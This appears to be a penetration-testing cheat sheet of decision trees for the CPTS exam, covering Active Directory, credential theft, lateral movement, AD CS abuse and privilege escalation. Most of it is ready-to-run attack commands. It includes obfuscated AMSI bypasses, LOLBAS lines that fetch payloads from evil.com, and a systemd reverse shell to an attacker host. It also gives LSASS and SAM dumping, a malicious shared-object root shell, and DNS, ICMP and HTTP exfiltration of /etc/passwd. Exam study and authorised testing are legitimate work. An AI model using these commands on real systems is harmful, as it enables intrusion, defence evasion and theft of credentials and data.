  ┌──────────────────────────────────────────────────────────────────┐
  │  AD: Responder → Password spray → Kerberoast → BloodHound → DA  │
  └─────────────────────────┬────────────────────────────────────────┘
                            ▼
  ┌──────────────────────────────────────────────────────────────────┐
  │  LATERAL: Credential reuse → Pass-the-Hash → ACL attacks → DCSync│
  └─────────────────────────┬────────────────────────────────────────┘
                            ▼
  ┌──────────────────────────────────────────────────────────────────┐
  │  REPORT: Screenshots (whoami/hostname/ipconfig) → Business impact│
  └──────────────────────────────────────────────────────────────────┘
```

# ═══════════════════════════════════════════════════════════
# SUPPLEMENTARY DECISION FLOWS — Added from Academy OG Analysis
# ═══════════════════════════════════════════════════════════

## SUPP-1: CMD vs PowerShell Decision

```
Got shell on Windows host?
├─ Windows XP/2000 or older? → CMD
├─ PowerShell blocked by exec policy? → CMD (or: -ExecutionPolicy Bypass)
├─ Need .NET access / advanced features? → PowerShell
├─ Stealth primary concern? → CMD (less logging, no AMSI)
└─ Otherwise → PowerShell (faster, more powerful)

PowerShell evasion needed?
├─ AMSI blocking? → [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
├─ Execution policy? → powershell -ExecutionPolicy Bypass -NoProfile -Command "IEX ..."
└─ Download cradle? → Use Harmj0y cradles (proxy-aware, no disk touch)
```

## SUPP-2: TTY Stabilization — When Python NOT Available

```
Got non-TTY shell? Need interactive TTY?
├─ Python3 available? → python3 -c 'import pty; pty.spawn("/bin/bash")'
├─ Perl available? → perl -e 'exec "/bin/sh";'
├─ Ruby available? → ruby: exec "/bin/sh"
├─ Lua available? → lua: os.execute('/bin/sh')
├─ AWK available? → awk 'BEGIN {system("/bin/sh")}'
├─ Find available? → find . -exec /bin/sh \; -quit
├─ Vim available? → vim -c ':!/bin/sh' → :set shell=/bin/bash → :shell
└─ Nothing? → /bin/sh -i

After getting TTY:
1. Ctrl+Z to background
2. stty raw -echo; fg
3. export TERM=xterm-256color
4. stty rows 42 columns 176
```

## SUPP-3: Pass-the-Hash Decision Flow

```
Got NTLM hash? Want lateral movement?
├─ Target is Windows + have admin on target?
│  ├─ evil-WinRM available? → evil-winrm -i IP -u User -H HASH
│  ├─ RDP access? → xfreerdp /v:TARGET /u:User /pth:HASH
│  │  └─ IF Restricted Admin Mode not enabled:
│  │     └─ reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
│  ├─ SMB access? → crackmapexec smb IP -u User -H HASH --local-auth
│  └─ Full admin? → impacket-psexec/wmiexec/smbexec -hashes :HASH User@IP
├─ Target is Linux? → PtH NOT applicable (use found passwords/keys)
└─ DCC2 hash? → CANNOT use for PtH → must crack first (hashcat -m 2100)

Local account PtH failing?
└─ Check LocalAccountTokenFilterPolicy:
   └─ Value 0 = filtered token (PtH fails) → Value 1 = full token (PtH works)
```

## SUPP-4: Pass-the-Ticket Decision Flow

```
Got Kerberos tickets or hashes?
├─ Windows + have session with tickets?
│  ├─ Mimikatz → sekurlsa::tickets /export → kerberos::ptt ticket.kirbi
│  └─ Rubeus → Rubeus.exe triage → Rubeus.exe dump → Rubeus.exe ptt /ticket:ticket.kirbi
├─ Linux + have ccache files?
│  ├─ find / -name "*.ccache" -o -name "krb5cc_*"
│  └─ export KRB5CCNAME=/path/to/ticket.ccache → impacket-psexec -k -no-pass dom/user@target
├─ Linux + have keytab files?
│  ├─ find / -name "*.keytab"
│  └─ klist -k -t -K -e /path/to/keytab → kinit -kt keytab principal@DOM
├─ Cross-platform conversion?
│  └─ impacket-ticketConverter ticket.kirbi ticket.ccache (or reverse)
└─ OverPass-the-Hash (hash → TGT)?
   └─ Mimikatz: sekurlsa::pth /user:admin /domain:DOM /ntlm:HASH /run:"klist"
```

## SUPP-5: Credential Hunting Decision Flow

```
Got access to a host? Need credentials?
├─ IF Linux:
│  ├─ Automated → ./linpeas.sh -a
│  ├─ Memory dump → sudo ./mimipenguin.sh
│  ├─ Stored creds → laazagne all
│  ├─ Kerberos → find *.ccache, *.keytab → klist
│  ├─ Browser → firefox_decrypt.py /path/to/profile
│  └─ Key locations → /etc/shadow, ~/.ssh/id_rsa, ~/.bash_history, ~/.aws/credentials
├─ IF Windows:
│  ├─ Saved creds → cmdkey /list → runas /savecred /user:Admin cmd.exe
│  ├─ LSASS dump → rundll32.exe comsvcs.dll MiniDump PID lsass.dmp full
│  │  └─ Parse → pypykatz lsa minidump lsass.dmp
│  ├─ SAM/SYSTEM → reg save HKLM\SAM C:\SAM; reg save HKLM\SYSTEM C:\SYSTEM
│  │  └─ Extract → impacket-secretsdump -sam SAM -system SYSTEM LOCAL
│  ├─ NTDS.dit → impacket-secretsdump -just-dc DOM/USER:PASS@DC
│  ├─ Network traffic → tcpdump -i tun0 -w capture.pcap → Wireshark
│  └─ Network shares → Snaffler.exe -s -d DOM -o snaffler.log
└─ IF AD Domain:
   ├─ BloodHound → SharpHound.exe -c All -d DOMAIN
   ├─ LDAP → windapsearch --dc-ip IP -d dom -u user -p pass --users --groups
   ├─ Kerberoast → impacket-GetUserSPNs DOM/user:pass -dc-ip DC -request
   ├─ AS-REP roast → impacket-GetNPUsers DOM/ -usersfile users.txt -format hashcat
   └─ AD CS → certipy find -u user@dom -p pass -dc-ip DC
```

## SUPP-6: File Transfer Decision Flow

```
Need to transfer files to/from target?
├─ IF Linux target:
│  ├─ HTTP simple → python3 -m http.server (attacker) → wget/curl (target)
│  ├─ No wget/curl → Bash /dev/tcp → exec 3<>/dev/tcp/IP/PORT
│  ├─ Encrypted → OpenSSL s_server/s_client
│  ├─ SCP → scp file user@target:/path
│  ├─ HTTPS upload → uploadserver + curl -X POST
│  └─ Quick serve → php -S 0.0.0.0:8000 OR ruby -run -ehttpd . -p8000
├─ IF Windows target:
│  ├─ HTTP → powershell Invoke-WebRequest -UseBasicParsing
│  ├─ BITS → bitsadmin /transfer URL DEST (legitimate service, persistent)
│  ├─ Certutil → certutil -urlcache -split -f URL (AMSI detected!)
│  ├─ LOLBAS → certreq -Post URL -config "outfile"
│  ├─ JS/VBS → cscript wget.js/wget.vbs URL output
│  ├─ WinRM → Copy-Item -ToSession/-FromSession
│  ├─ RDP drive → xfreerdp /drive:loot,/path → \\tsclient\loot
│  └─ WebDAV → wsgidav → net use Z: http://IP/
└─ IF both blocked:
   ├─ Base64 encode → paste in terminal → decode on other side
   ├─ SMB authenticated → impacket-smbserver with user/pass
   └─ ICMP/DNS tunnel → ptunnel-ng or dnscat2
```

## SUPP-7: Password Cracking Decision Flow

```
Got hashes? Need to crack them?
├─ Identify hash type:
│  ├─ NTLM → hashcat -m 1000
│  ├─ Net-NTLMv2 → hashcat -m 5600
│  ├─ Kerberos TGS → hashcat -m 13100
│  ├─ AS-REP → hashcat -m 18200
│  ├─ DCC2 → hashcat -m 2100 (CANNOT PtH — must crack)
│  ├─ ZIP → hashcat -m 13600 (or zip2john + john)
│  ├─ PDF → hashcat -m 10500 (or pdf2john + john)
│  ├─ SSH key → hashcat -m 22921 (or ssh2john + john)
│  ├─ KeePass → hashcat -m 13400
│  └─ 7-Zip → hashcat -m 11600
├─ Choose attack type:
│  ├─ Dictionary → hashcat -m MODE hash.txt rockyou.txt
│  ├─ Rule-based → hashcat -m MODE hash.txt rockyou.txt -r rules/best64.rule
│  ├─ Combinator → hashcat -m MODE hash.txt dict1.txt dict2.txt -a 1
│  ├─ Mask → hashcat -m MODE hash.txt -a 3 ?u?l?l?l?d?d?d?d
│  └─ Hybrid → hashcat -m MODE hash.txt wordlist.txt -a 6 ?d?d?d?d
├─ Custom wordlist needed?
│  ├─ From target profile → cupp -i
│  ├─ From target website → cewl -d 3 -m 5 -w output.txt URL
│  └─ From employee names → username-anarchy
└─ John vs Hashcat?
   ├─ Hashcat → GPU cracking, fastest, most modes
   └─ John → CPU cracking, great rules, incremental mode, format conversion
```

## SUPP-8: Pivoting Detection & Prevention

```
Want to detect/defend against pivoting?
├─ Establish baseline:
│  ├─ Document DNS records, network device backups, DHCP configs
│  ├─ Maintain app inventory, host list, elevated permission users
│  ├─ Identify dual-homed hosts, maintain network diagrams
│  └─ Tools: Netbrain, diagrams.net (Draw.io)
├─ Monitor for:
│  ├─ Beaconing → regular interval connections = C2
│  ├─ Non-standard ports → traffic on 444 instead of 443
│  ├─ New listeners → unexpected services on non-standard ports
│  └─ Protocol tunneling → DNS/ICMP traffic with unusual patterns
└─ MITRE mapping:
   ├─ T1133 → External Remote Services (VPN, RDP monitoring)
   ├─ T1021 → Remote Services (network segmentation, logging)
   ├─ T1571 → Non-Standard Ports (port monitoring, allowlisting)
   ├─ T1572 → Protocol Tunneling (DPI, traffic analysis)
   └─ T1090 → Proxy Use (egress filtering, proxy logging)
```

## SUPP-9: Web Application Advanced Decision Flow

```
Enumerating web application?
├─ Directory brute force:
│  ├─ ffuf -u http://target/FUZZ -w wordlist -recursion -recursion-depth 3
│  ├─ ffuf -u http://target/FUZZ -w wordlist -ac (auto-tune)
│  └─ ffuf -u http://target/FUZZ -w wordlist -e .php,.txt,.js,.bak
├─ File upload detected?
│  ├─ Extension blacklist → .pHp, .php5, .phtml, shell.php.jpg, shell.php%00.jpg
│  ├─ MIME check → Burp: Content-Type application/x-php → image/gif
│  ├─ Magic bytes → Add GIF89a; before PHP code
│  └─ Web shells → Laudanum (/usr/share/laudanum), Antak (Nishang)
├─ Login form detected?
│  ├─ Hydra → hydra -l admin -P wordlist http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
│  └─ ffuf → ffuf -u http://target/login -X POST -d "user=admin&pass=FUZZ" -w wordlist -mc 200
├─ Parameters detected?
│  ├─ LFI → ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://target?page=FUZZ'
│  ├─ Command injection → bypasses: ${IFS} (spaces), ${PATH:0:1} (slashes)
│  └─ SQLi → sqlmap -u "http://target/page?param=val" --batch
└─ XSS found?
   ├─ Reflected → in URL parameter
   ├─ Stored → in database (blog comments, forums)
   ├─ DOM-based → client-side JavaScript processing
   └─ CSP bypass → use allowed CDN with JSONP
```

## SUPP-10: PrivEsc Quick Reference

```
Got shell? Want higher privileges?
├─ IF Linux:
│  ├─ sudo -l → GTFOBins
│  ├─ SUID binaries → find / -perm -4000 2>/dev/null → GTFOBins
│  ├─ Capabilities → getcap -r / 2>/dev/null
│  ├─ Crontab → crontab -l; ls -la /etc/cron*
│  ├─ NFS → showmount -e → no_root_squash → SUID binary
│  ├─ PATH hijack → script calls command without full path
│  ├─ Wildcard injection → tar with --checkpoint in cron
│  └─ Automated → ./linpeas.sh -a
└─ IF Windows:
   ├─ whoami /priv → SeImpersonate → Potato exploits (PrintSpoofer)
   ├─ whoami /priv → SeBackupOperator → reg save SAM/SYSTEM
   ├─ whoami /priv → SeRestoreOperator → replace binary → persistence
   ├─ AlwaysInstallElevated → reg query → if both = 1 → msiexec
   ├─ Unquoted service paths → find and inject
   ├─ LSASS dump → pypykatz
   └─ Automated → winPEASx64.exe
```

## SUPP-11: Exam-Specific Tips (CPTS)

```
CPTS Exam Preparation:
├─ Before exam:
│  ├─ Verify ALL tools installed: Responder, CrackMapExec, Impacket, evil-WinRM, BloodHound
│  ├─ Wordlists ready: rockyou.txt, Seclists, LFI-Jhaddix.txt, subdomain lists
│  ├─ Listeners pre-configured: nc -nvlp 443, nc -nvlp 8080
│  ├─ tmux layout ready: VPN, listeners, scans, exploits, Responder
│  └─ Export variables: IP, LHOST, DOMAIN
├─ During exam:
│  ├─ Enumerate EVERYTHING before exploiting
│  ├─ Full port scan ALWAYS (-p- or RustScan)
│  ├─ UDP scan — don't skip
│  ├─ Document EVERY finding with screenshots
│  ├─ Focus on BUSINESS IMPACT in report
│  └─ Time management: don't get stuck on one host
└─ Report:
   ├─ Screenshots: whoami, hostname, ipconfig for EACH compromised host
   ├─ Business impact focus (not just technical findings)
   ├─ Cleanup: remove shells, tools, added users
   └─ Proof: demonstrate full attack chain from initial access to DA
```

---


## SUPP-12: Additional Tool Quick Reference

```
Impacket Extended:
├─ lookupsid.py → SID brute user enum
├─ ticketer.py → Golden ticket creation
├─ raiseChild.py → Child-to-parent domain escalation
├─ adidnsdump → AD DNS record enumeration
└─ gpp-decrypt → GPP password decryption

Windows PrivEsc Enum:
├─ Watson → .NET missing KB enum + exploit suggestions
└─ WES-NG → systeminfo-based missing KB + CVE enumeration

AD Security Auditing:
├─ PingCastle → AD security score (CMMI-like)
└─ Group3r → GPO misconfiguration auditor

Web Recon:
├─ EyeWitness → Screenshot all web apps, HTML report
└─ Aquatone → Subdomain screenshotting from Nmap XML

DB GUI Tools:
├─ DBeaver → Multi-platform (MSSQL, MySQL, PostgreSQL, Oracle)
├─ HeidiSQL → Windows (MySQL, MSSQL, PostgreSQL)
├─ MySQL Workbench → MySQL
├─ SSMS → MSSQL (Windows)
└─ sqsh → CLI MSSQL (Linux)

Email Clients:
├─ Evolution → Linux GNOME
├─ Thunderbird → Multi-platform
├─ mutt → Linux CLI
└─ Claws Mail, Geary, MailSpring

Credential Hunting:
└─ SessionGopher → PuTTY, WinSCP, FileZilla, RDP saved sessions

Historical Recon:
└─ Wayback Machine (web.archive.org) → Old pages, leaked configs
```


# ═══════════════════════════════════════════════════════════
# SUPP-13: AD CS (Active Directory Certificate Services) — ESC1 through ESC8
# ═══════════════════════════════════════════════════════════

```
FOUND Certificate Authority (CA) in environment?
├─ Port 135/445 + Certificate Services role detected?
│  ├─ CHECK: Web Enrollment on port 80/443? → certipy find / certify.exe
│  ├─ CHECK: ADCS Web Enrollment accessible? → http://CA_SERVER/certsrv/
│  └─ CHECK: Misconfigured templates? → certipy find -u user@dom -p pass -dc-ip DC -vulnerable
│
├─ AD CS ESC1-ESC8 Decision Flow:
│  ├─ ESC1 (Misconfigured Certificate Template):
│  │  ├─ Template allows ENROLLEE_SUPPLIES_SUBJECT + has Client Authentication EKU
│  │  ├─ certipy req -ca 'CA_NAME' -template 'VULN_TEMPLATE' -upn Administrator@domain -dc-ip DC
│  │  └─ Result: Get certificate as ANY user → authenticate as DA
│  ├─ ESC2 (Misconfigured Certificate Template - Any Purpose):
│  │  ├─ Template has "Any Purpose" EKU (1.3.6.1.4.1.311.21.8.1 or 2.5.29.37.0)
│  │  └─ Can request certificate for ANY purpose → same as ESC1 but broader
│  ├─ ESC3 (Enrollment Agent Template):
│  │  ├─ Template has Certificate Request Agent EKU
│  │  └─ Use to request certificate ON BEHALF OF another user
│  ├─ ESC4 (Vulnerable Certificate Template Access Control):
│  │  ├─ User has Write/Owner permissions on template
│  │  ├─ certipy template -user user@dom -pass pass -dc-ip DC -template 'VULN_TEMPLATE' -save-old
│  │  └─ Modify template to enable ENROLLEE_SUPPLIES_SUBJECT → exploit as ESC1
│  ├─ ESC5 (Vulnerable PKI Object ACLs):
│  │  └─ Generic misconfiguration in AD CS objects → audit with certipy find -vulnerable
│  ├─ ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2):
│  │  ├─ CA flag allows subject alternative names in ANY request
│  │  ├─ certipy find -u user@dom -p pass -dc-ip DC
│  │  └─ Request cert with -upn Administrator@domain → get DA cert
│  ├─ ESC7 (Vulnerable Certificate Authority Access Control):
│  │  ├─ User has Manage CA or Manage Certificates permissions
│  │  ├─ certipy ca -u user@dom -p pass -dc-ip DC -ca 'CA_NAME' -add-officer 'user'
│  │  └─ Enable ESC6 flag → request certificate as DA
│  └─ ESC8 (NTLM Relay to AD CS HTTP Endpoints):
│     ├─ ADCS Web Enrollment enabled? → impacket-ntlmrelayx -t http://CA/certsrv/ -smb2support --adcs
│     ├─ Coerce auth via PetitPotam/PrinterBug/xp_dirtree
│     └─ Result: Relay → get certificate → authenticate as relayed user
│
├─ Tool Choice:
│  ├─ Linux (preferred) → certipy (find, req, auth, ca, template)
│  └─ Windows → Certify.exe (find, request, download, convert)
│
└─ After getting certificate:
   ├─ certipy auth -pfx user.pfx -dc-ip DC_IP -domain DOMAIN
   ├─ Convert .pfx to .kirbi for Rubeus: certipy pfx -in user.pfx -nocert -out user.kirbi
   └─ Rubeus.exe asktgt /user:admin /certificate:user.kirbi /ptt
```

---

# ═══════════════════════════════════════════════════════════
# SUPP-14: Modern Evasion & AMSI — Strategy for Failure
# ═══════════════════════════════════════════════════════════

```
Defender RealTimeProtection ON? AMSI blocking PowerShell?
│
├─ STEP 1: Check what you're up against
│  ├─ Get-MpComputerStatus | Select RealTimeProtectionEnabled, AntivirusEnabled
│  ├─ [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)
│  └─ whoami /priv → check for SeDebugPrivilege, SeImpersonatePrivilege
│
├─ STEP 2: Living Off the Land (LOLBAS) Execution Branch
│  ├─ mshta.exe → Execute HTA files with embedded JavaScript/VBScript
│  │  └─ mshta.exe javascript:a=GetObject("script:https://evil.com/payload.sct").Exec();
│  ├─ rundll32.exe → Load and execute DLL exports
│  │  └─ rundll32.exe \evil.com\share\payload.dll,EntryPoint
│  ├─ InstallUtil.exe → .NET assembly execution (bypasses AppLocker)
│  │  └─ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
│  ├─ regsvr32.exe → Execute COM scriptlets (SCT files)
│  │  └─ regsvr32.exe /s /n /u /i:https://evil.com/payload.sct scrobj.dll
│  ├─ certutil.exe → Download + decode payloads
│  │  └─ certutil -urlcache -split -f https://evil.com/payload.b64 && certutil -decode payload.b64 payload.exe
│  ├─ forfiles.exe → Execute commands via file iteration
│  │  └─ forfiles /p C:\Windows\System32 /m cmd.exe /c "payload"
│  └─ cmstp.exe → Execute INF files with embedded commands
│     └─ cmstp.exe /ni /s payload.inf
│
├─ STEP 3: PowerShell Constrained Language Mode (CLM) Bypass
│  ├─ Check if in CLM: $ExecutionContext.SessionState.LanguageMode
│  ├─ If CLM: Use full .NET via InstallUtil (above)
│  ├─ Alternative: Use csc.exe to compile C# payloads in memory
│  └─ Alternative: Use Python/Ruby if installed (avoids PowerShell entirely)
│
├─ STEP 4: AMSI Bypass Techniques
│  ├─ [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
│  ├─ S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1q2'+'u3x') ) = ( [TyPe]("{1}{0}"-F'F','rE') ) ; ( Get-Varia`ble ('1q2'+'u3x') -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('ams'+'i'),'d','I'+'nitF'+'aile' ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ) )."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
│  ├─ Use compiled C# binary instead of PowerShell (compiled = no AMSI scan)
│  └─ Use unmanaged code (Meterpreter, Cobalt Strike) that never loads PowerShell
│
└─ STEP 5: If all else fails → Linux tools via WSL
   ├─ Check: wsl --list
   └─ WSL traffic NOT parsed by Windows Firewall or Defender
```

---

# ═══════════════════════════════════════════════════════════
# SUPP-15: Deep Linux Internals — Advanced PrivEsc
# ═══════════════════════════════════════════════════════════

```
Standard Linux PrivEsc (sudo/SUID/cron) failed? Go DEEPER:
│
├─ Shared Object (.so) Hijacking
│  ├─ Check custom binaries: find / -type f -perm -o+x -newer /etc/passwd 2>/dev/null
│  ├─ Check for missing .so files: ldd /path/to/binary | grep "not found"
│  ├─ Check for writable .so directories: for lib in $(ldd /path/to/binary | awk '{print $3}'); do test -w "$lib" && echo "$lib is WRITABLE"; done
│  ├─ If .so is writable or in writable directory → replace with malicious .so
│  └─ Compile malicious .so:
│     └─ gcc -shared -o libevil.so -fPIC -Wl,-soname,libevil.so evil.c
│        // evil.c: __attribute__((constructor)) void init() { setuid(0); system("/bin/bash"); }
│
├─ Python Library Hijacking
│  ├─ Check Python paths: python3 -c "import sys; print('\n'.join(sys.path))"
│  ├─ Look for writable directories in sys.path
│  ├─ Check if script imports modules without full path: grep -r "^import\|^from" /opt/scripts/ 2>/dev/null
│  ├─ If script does: import module → Create /writable/path/module.py with reverse shell
│  └─ Check PYTHONPATH env var: echo $PYTHONPATH → if set, directories may be writable
│
├─ Capabilities Abuse (getcap -r /) — OFTEN THE INTENDED PATH
│  ├─ Full scan: getcap -r / 2>/dev/null
│  ├─ Common dangerous capabilities:
│  │  ├─ cap_setuid+ep → python -c 'import os; os.setuid(0); os.system("/bin/bash")'
│  │  ├─ cap_dac_read_search+ep → read ANY file (including /etc/shadow)
│  │  ├─ cap_net_raw+ep → packet capture, ARP spoofing
│  │  ├─ cap_sys_admin+ep → mount filesystems, Docker escape
│  │  ├─ cap_fowner+ep → change file ownership, bypass permissions
│  │  ├─ cap_chown+ep → change file ownership
│  │  ├─ cap_setfcap+ep → set file capabilities (escalate to other caps)
│  │  ├─ cap_sys_ptrace+ep → ptrace processes, inject code
│  │  └─ cap_dac_override+ep → bypass file permission checks
│  └─ GTFOBins: https://gtfobins.github.io/#+capabilities
│
├─ Writable Systemd Services
│  ├─ Check for writable service files: find /etc/systemd /lib/systemd /usr/lib/systemd -writable -name "*.service" 2>/dev/null
│  ├─ If writable → add ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
│  └─ Trigger: systemctl daemon-reload && systemctl start service
│
├─ Docker/Container Escape
│  ├─ Check if in container: cat /proc/1/cgroup | grep docker
│  ├─ Check for Docker socket: ls -la /var/run/docker.sock
│  ├─ If socket accessible → docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
│  └─ Check for privileged container: cat /proc/self/status | grep Cap → cap_sys_admin
│
├─ NFS Root Squashing (re-check)
│  ├─ showmount -e TARGET → if export with no_root_squash
│  └─ Mount, create SUID binary, execute on target
│
├─ Kernel Exploits (LAST RESORT — unstable)
│  ├─ Check kernel version: uname -r
│  ├─ Check for known exploits: searchsploit linux kernel <version>
│  └─ Common: Dirty COW (CVE-2016-5195), Dirty Pipe (CVE-2022-0847), overlayfs (CVE-2021-3493)
│
└─ Automated Deep Enum:
   ├─ linpeas.sh -a → covers ALL of the above
   └─ lse.sh -l 2 → Linux Smart Enumeration, level 2 (more thorough)
```

---

# ═══════════════════════════════════════════════════════════
# SUPP-16: OOB (Out-of-Band) Data Exfiltration — Blind Command Injection
# ═══════════════════════════════════════════════════════════

```
Blind command injection? Can't get reverse shell? (Hardened DMZs, WAFs)
│
├─ DECISION: What protocol can reach you?
│  ├─ DNS allowed outbound? → DNS exfiltration (most reliable)
│  ├─ ICMP allowed outbound? → ICMP exfiltration
│  ├─ HTTP/HTTPS allowed outbound? → HTTP exfiltration
│  └─ Nothing allowed? → Timing-based blind injection (slow but possible)
│
├─ DNS Exfiltration (via dnstool or manual encoding)
│  ├─ Setup listener: while true; do nc -lvnp 53; done  # OR use dnscat2 server
│  ├─ Encode + send data:
│  │  ├─ hex=$(cat /etc/passwd | xxd -p | tr -d '\n')
│  │  ├─ chunk_size=50
│  │  ├─ for ((i=0; i<${#hex}; i+=chunk_size)); do chunk=${hex:i:chunk_size}; dig "$chunk.evil.com"; done
│  │  └─ Decode received chunks on attacker side
│  ├─ Automated: dnscat2 --dns server=ATTACKER,port=53 --secret=SECRET
│  └─ Alternative: iodine for full TCP tunnel over DNS
│
├─ ICMP Exfiltration
│  ├─ Encode data in ICMP payload:
│  │  ├─ data=$(cat /etc/passwd | base64 | tr -d '\n')
│  │  ├─ for ((i=0; i<${#data}; i+=20)); do ping -p "${data:i:20}" ATTACKER_IP; done
│  │  └─ Capture with: tcpdump -i tun0 -w capture.pcap → extract payloads in Wireshark
│  └─ Alternative: ptunnel-ng for full TCP tunnel over ICMP
│
├─ HTTP/HTTPS Exfiltration
│  ├─ POST data to attacker:
│  │  ├─ curl -X POST http://ATTACKER/collect -d "$(cat /etc/passwd | base64)"
│  │  ├─ wget --post-data="$(cat /etc/passwd | base64)" http://ATTACKER/collect
│  │  └─ powershell: Invoke-RestMethod -Uri http://ATTACKER/collect -Method POST -Body $(Get-Content file | base64)
│  └─ Attacker: python3 -m http.server 80 → logs all requests with data
│
├─ Timing-Based Blind Extraction (when NOTHING reaches you)
│  ├─ Boolean-based: IF condition_true THEN sleep 5
│  │  ├─ Test: if [ $(whoami) = "root" ]; then sleep 5; fi
│  │  └─ Measure response time to determine true/false
│  ├─ Character-by-character extraction:
│  │  └─ for c in {a..z}; do if [ "$(whoami | cut -c1)" = "$c" ]; then sleep 5; fi; done
│  └─ Automated: sqlmap --technique=T (time-based) for SQLi
│
└─ Proof of Concept for Blind Injection (no shell needed)
   ├─ Ping-based: Inject command that pings YOUR IP → proves execution
   ├─ DNS-based: Inject nslookup YOUR_IP → proves execution
   ├─ HTTP-based: Inject curl http://YOUR_IP → proves execution
   └─ Time-based: Inject sleep 10 → proves execution via response delay
```

---

# ═══════════════════════════════════════════════════════════
# SUPP-17: CPTS Evidence Checklist — Reporting Proof of Concept
# ═══════════════════════════════════════════════════════════

```
FOR EVERY compromised host (exam requirement — incomplete proof = FAIL):
│
├─ REQUIRED Evidence:
│  ├─ 1. whoami && hostname && ipconfig /all (or ifconfig on Linux)
│  │   └─ Screenshot MUST show: username, hostname, IP configuration
│  ├─ 2. flag.txt content AND its full file path
│  │   ├─ cat /path/to/flag.txt && echo "---" && pwd
│  │   └─ Screenshot MUST show both: flag content AND path
│  ├─ 3. Screenshot of the EXACT exploit command used
│  │   └─ Terminal showing: command typed → command executed → result
│  ├─ 4. Privilege level achieved (user → root/SYSTEM/DA)
│  │   └─ Linux: id && whoami
│  │   └─ Windows: whoami && whoami /priv && whoami /groups
│  └─ 5. Network position (which subnet, which NIC)
│     └─ ip addr / ipconfig showing all interfaces
│
├─ RECOMMENDED Evidence:
│  ├─ Full attack chain documentation (initial access → privilege escalation → lateral movement)
│  ├─ Timestamps for each step
│  ├─ Tool output logs (not just screenshots)
│  ├─ Before/after system state (for destructive actions)
│  └─ Cleanup confirmation (removed shells, tools, added users)
│
├─ Report Structure (per host):
│  ├─ Executive Summary: What was compromised, business impact
│  ├─ Technical Details: Step-by-step reproduction
│  │   ├─ Prerequisites (what you had before)
│  │   ├─ Exploitation (exact commands, tool versions)
│  │   ├─ Result (what you gained)
│  │   └─ Proof (screenshots, flags, paths)
│  ├─ Remediation: How to fix the vulnerability
│  └─ Risk Rating: CVSS score + business context
│
└─ Exam-Specific Tips:
   ├─ Take screenshots EARLY — shells can die during exam
   ├─ Save ALL terminal output to log files (script, tee, tmux logging)
   ├─ Document the FULL attack path, not just the final step
   ├─ Show HOW you found the vulnerability, not just that it exists
   └─ Business impact > technical details in executive summary
```

---


---

> *"Enumeration is everything. The more you enumerate, the easier the exploitation becomes."*
>
> *"Leave no stone unturned. Every answer leads to a new question. Every question leads to a new attack surface."*

---

*Version 2.0 — Decision Tree Edition — April 2026*
*Synthesized from ALL CPTS Notes: Preparation, Footprinting, Web Enumeration, File Transfers, Shells & Payloads, Active Directory Attacks, Pivoting & Tunneling, Privilege Escalation, and Reporting.*
